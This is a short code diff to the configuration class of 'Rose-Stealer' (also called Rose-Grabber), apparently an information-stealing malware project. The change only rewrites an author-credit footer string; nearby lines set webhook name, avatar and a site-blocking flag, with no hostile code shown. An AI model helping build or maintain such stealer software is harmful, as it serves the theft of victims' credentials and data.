@@ -45,7 +45,7 @@ class Config:
         self.block_sites = False
 
         self.eb_color = 16711680
-        self.eb_footer = "Rose-Stealer | t.me/rosegrabber | by gum, xpierroz, suegdu, suvan"
+        self.eb_footer = "Rose-Stealer | t.me/rosegrabber | maintained by gumbobrot and something"
         self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png"
         self.wh_name = "Rose-Stealer | t.me/rosegrabber"
 
